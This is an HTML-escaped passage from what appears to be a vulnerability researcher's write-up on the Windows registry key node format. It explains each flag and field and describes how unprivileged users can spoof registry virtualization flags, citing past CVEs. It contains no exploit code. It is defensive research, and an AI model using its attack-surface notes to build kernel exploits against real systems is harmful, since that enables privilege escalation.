 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x04a&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ClassLength&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x04c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[1]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Wchar&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In the following subsections, each member is discussed in more detail.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.gd0w0pnn3tb7&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Signature&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This field always stores the special value 0x6B6E, which translates to &amp;#39;nk&amp;#39; when written in little-endian. It exists for informational purposes only, and isn&amp;#39;t used for anything meaningful in the code after the initial sanitization during load.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.j7ze5ahyvb63&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Flags&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This is a highly interesting and security-relevant field, as it indicates the role of the key in the hive, and clarifies how certain parts of the key node are formatted. The present and historical flags are presented in the table below together with their names and descriptions:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Mask&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0001&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_VOLATILE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15 MvcjwGOuIU-c10&quot;&gt;(Deprecated)&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;The flag used to indicate that the key and all its subkeys were volatile, but it is obsolete now and hasn&amp;#39;t been used in several decades. Information about the key stable/volatile state can be inferred from the highest bit of the key&amp;#39;s cell index.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0002&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_HIVE_EXIT&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Indicates that the key is the mount point of another registry hive. These special mount points are used to facilitate attaching new registry hives to the global registry view starting at \Registry in a live system. Exit nodes only ever exist in memory, so hives on disk mustn&amp;#39;t have the flag set. More on the subject of mount points and exit nodes can be found in the next section, &amp;quot;Link nodes&amp;quot;.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0004&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_HIVE_ENTRY&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Indicates that the given key is the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;to a hive, or in other words, the root of a hive. The flag must be set on the root key of each hive, and mustn&amp;#39;t be set on any other nested keys. A hive entry key cannot be a symbolic link (KEY_SYM_LINK mustn&amp;#39;t be set).&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0008&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_NO_DELETE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Indicates that the key cannot be deleted: any attempt to do so will return the error code STATUS_CANNOT_DELETE. This flag is always set on hive exit and hive entry keys, but is not allowed for any other keys.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0010&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_SYM_LINK&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Indicates that the key is a symbolic link, which has been created by specifying the REG_OPTION_CREATE_LINK flag in the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw&quot;&gt;RegCreateKeyEx&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;call. They are freely accessible and don&amp;#39;t come with many restrictions: every key other than a hive exit/entry key can be a symbolic link. However, they are required to adhere to additional structural requirements: they may only contain up to one value, and that value must be of type REG_LINK (6), named &amp;quot;SymbolicLinkValue&amp;quot;, and a maximum of 65534 bytes long (32767 wide characters).&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0020&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_COMP_NAME&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Indicates that the name of the key consists of ASCII characters only, and thus it has been &amp;quot;compressed&amp;quot; to fit two 8-bit characters in each of the 16-bit wide characters of _CM_KEY_NODE.Name. This optimization aims to save storage space and memory, especially as a great majority of keys have simple, alphanumeric names. This flag can be set on virtually every key in the registry, and indeed, it is by far the most commonly used one.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0040&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;KEY_PREDEF_HANDLE&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15 MvcjwGOuIU-c10&quot;&gt;(Deprecated)&lt;/span&gt;&lt;span&gt;&amp;nbsp;The flag used to indicate that the key was a &amp;quot;predefined-handle key&amp;quot;, which was a special kind of a symbolic link. The name refers to &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys&quot;&gt;Predefined Keys&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a set of top-level keys such as HKLM or HKCU recognized by the Win32 API. Keys with the KEY_PREDEF_HANDLE flag set allowed the system to redirect certain keys to chosen 32-bit HKEY pseudo-handles, and were specifically introduced in Windows NT 3.5 in 1994 for the purpose of redirecting two system keys related to &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/perfctrs/using-the-registry-functions-to-consume-counter-data&quot;&gt;reading performance data through the registry&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_88bs2bqozfm2-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\009 &amp;rarr; HKEY_PERFORMANCE_TEXT&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Perflib\CurrentLanguage &amp;rarr; HKEY_PERFORMANCE_NLSTEXT&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Contrary to regular symbolic links, predefined keys re-purposed parts of the key node structure (specifically the value list length) to store the link destination, instead of using higher-level features of the format (such as the &amp;quot;SymbolicLinkValue&amp;quot; which is otherwise a perfectly normal value associated with a key). Such a change in semantics required a significant amount of special handling of predefined keys, which were not supposed to be operated on other than being opened. This, in turn, led to a number of security vulnerabilities related to the feature. For a detailed case study of one of them, CVE-2023-35633, see my &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://j00ru.vexillium.org/talks/confidence-windows-registry-deja-vu-the-return-of-confused-deputies/&quot;&gt;Windows Registry Deja Vu: The Return of Confused Deputies&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;talk from CONFidence 2024.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As recently as 2023, all keys other than hive roots could be predefined keys, provided that they had been manually crafted in a binary controlled hive, because there was otherwise no supported way to create them via API. As a consequence of my reports, the feature was deprecated completely in July 2023 for Windows 10 1607+ and 11, and in December 2023 for older systems. At the time of this writing, the only two predefined keys left in existence are the original &amp;quot;009&amp;quot; and &amp;quot;CurrentLanguage&amp;quot; ones, and all other such keys are transparently converted to normal keys during hive load.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Furthermore, there are also three flags related to &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-virtualization&quot;&gt;Registry Virtualization&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, which was introduced in Windows Vista and is supported up to and including Windows 11:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Mask&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Name&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0080&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;VirtualSource&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Indicates that the key has been subject to virtualization, i.e. that it has a counterpart in the virtual store subtree. It is typically set on keys inside HKLM\Software which have been attempted to be opened with write access by a program running as a non-administrator.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0100&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;VirtualTarget&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Indicates that the key is a virtual replica of a key in a global system hive that has been subject to virtualization. It is typically set on keys inside HKU\&amp;lt;SID&amp;gt;_Classes\VirtualStore that have been created as a result of virtualization. It can only be set if VirtualStore (0x200) is set on the key, too.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0200&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c34&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;VirtualStore&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Indicates that the key is part of the virtual store registry subtree, typically HKU\&amp;lt;SID&amp;gt;_Classes\VirtualStore and its subkeys. It means that new virtualization targets may be created inside the key, but it itself isn&amp;#39;t necessarily a virtual key (unless the VirtualTarget flag is also set&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;As we can see, the purpose of these flags is to keep track of the virtualization state of each key. Given that they express the internal state&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the key and are intended to be modified by the kernel only, there doesn&amp;#39;t seem to be a good reason to allow user-mode clients to modify the flags on demand. But in practice, unprivileged users have a lot of control over them: programs may arbitrarily set them in hives loaded from disk that they control (app hives and the user hive), and they may also set and clear them at runtime with the NtSetInformationKey(KeySetVirtualizationInformation) system call, as long as they are granted KEY_SET_VALUE access to the key. This makes it effectively possible to &amp;quot;spoof&amp;quot; virtual source/target/store keys, and opens up all of the registry virtualization code for potential abuse by unprivileged users. This has led to the discovery of multiple bugs directly related to virtualization: &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451263&quot;&gt;CVE-2015-0073&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450862&quot;&gt;CVE-2019-0881&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;by James Forshaw, and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues?q%3Did:(42451475%2520%257C%252042451502%2520%257C%252042451512%2520%257C%252042451515%2520%257C%252042451516%2520%257C%252042451527%2520%257C%252042451589%2520%257C%252042451627)&quot;&gt;several more&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;as part of my recent research.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.xyaluvd02svg&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;LastWriteTime&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This is yet another timestamp, in this case tracked on a key-granularity level. I assume it may be an interesting artifact for purposes of digital forensics, but otherwise it doesn&amp;#39;t seem particularly security-relevant. One thing of note is that this information is very easy to query at runtime, as it is returned by the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryinfokeyw&quot;&gt;RegQueryInfoKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API, and is also a part of the output structures of numerous &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class&quot;&gt;key information classes&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;that can be queried via the NtQueryKey system call.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.z38qve8esj1q&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;AccessBits&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;While theoretically an 8-bit field, this is effectively a 2-bit bitmask introduced in Windows 8 as part of the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;hive reorganization&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;logic described earlier. It tracks the system phase(s) in which the key has been accessed: 0x0 if not accessed at all, 0x1 if accessed during boot, and 0x2 if accessed during normal system operation. This information is then used during reorganization to allocate key nodes with similar access bits close together.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.erwac4a7wmu8&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;LayerSemantics&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This member is a 2-bit enum, used exclusively in hive version 1.6, which corresponds to &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;differencing hives&lt;/span&gt;&lt;span&gt;&amp;nbsp;(also known as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;delta hives&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;). Differencing hives are closely related to containerization support, and their purpose is to be overlaid on another hive in the system rather than being mounted as a standalone hive. For this reason, every key in a differencing hive is in one of four states, which indicate how the key should be interpreted in relation to the keys below it (i.e. the corresponding keys in lower-layer hives).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
